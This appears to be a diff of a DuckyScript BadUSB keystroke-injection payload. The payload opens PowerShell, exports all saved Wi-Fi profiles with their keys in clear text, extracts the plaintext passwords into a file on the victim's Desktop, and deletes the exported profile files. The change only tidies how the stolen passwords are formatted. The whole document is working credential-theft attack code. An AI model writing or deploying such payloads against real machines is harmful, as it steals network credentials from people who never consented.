@@ -9,5 +9,5 @@ DELAY 500
 STRING powershell 
 ENTER
 DELAY 500
-STRING cd C:\Users\$env:UserName\Desktop;netsh wlan export profile key=clear;Select-String -Path WiFi-* -Pattern 'keyMaterial'>0.txt;del WiFi-*;exit
+STRING cd C:\Users\$env:UserName\Desktop; netsh wlan export profile key=clear; Select-String -Path WiFi-* -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > 0.txt; del WiFi-*;exit
 ENTER
